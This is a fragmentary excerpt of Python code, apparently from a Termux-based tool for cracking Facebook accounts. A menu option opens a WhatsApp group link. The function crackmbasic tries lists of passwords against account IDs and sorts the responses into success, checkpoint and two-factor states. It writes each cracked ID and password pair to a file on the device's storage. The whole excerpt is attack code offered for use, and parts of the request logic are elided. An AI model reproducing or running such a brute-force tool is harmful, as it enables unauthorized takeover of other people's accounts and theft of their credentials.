...
def caseher():
        ...
        if selectme in ["05","5","five"]:
                os.system("termux-open-url https://chat.whatsapp.com/+92365456679")
                caseher()
...
def crackmbasic(idf,pwv):
        ...
        for pw in pwv:
                        ...
                        if "www.facebook.com" in r.text:
                                print(f'   \r {rp}[AXB-CHECKPOINT] {idf} | {pw}{s}')     
                                ...
                                ok+=1
                                print(f'   \r {rg}[AXB-SUCCESSFULL] {roid} | {pw}{s}')
                                open('/sdcard/qsr_ok.txt','a').write(roid+'|'+pw+'\n')
                                break
                        elif "SMS shortly" in r.text:
                                print(f'   \r {rc}[AXB-2FACTOR] {idf} | {pw}{s}')
